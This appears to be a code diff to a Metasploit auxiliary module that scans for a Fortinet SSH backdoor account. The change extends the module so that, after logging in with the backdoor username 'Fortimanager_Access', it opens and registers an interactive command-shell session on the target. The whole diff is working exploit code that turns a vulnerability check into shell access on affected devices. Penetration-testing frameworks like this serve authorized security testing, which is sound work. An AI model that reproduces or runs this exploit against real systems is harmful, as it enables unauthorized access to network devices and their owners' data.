@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SSH
   include Msf::Exploit::Remote::Fortinet
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::CommandShell
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -63,15 +64,30 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if ssh
-      print_good("#{ip}:#{rport} - Logged in as Fortimanager_Access")
-      report_vuln(
-        host: ip,
-        name: self.name,
-        refs: self.references,
-        info: ssh.transport.server_version.version
-      )
-    end
+    return unless ssh
+
+    print_good("#{ip}:#{rport} - Logged in as Fortimanager_Access")
+
+    version = ssh.transport.server_version.version
+
+    report_vuln(
+      host: ip,
+      name: self.name,
+      refs: self.references,
+      info: version
+    )
+
+    shell = Net::SSH::CommandStream.new(ssh)
+
+    return unless shell
+
+    info = "Fortinet SSH Backdoor (#{version})"
+
+    ds_merge = {
+      'USERNAME' => 'Fortimanager_Access'
+    }
+
+    start_session(self, info, ds_merge, false, shell.lsock)
   end
 
   def rport
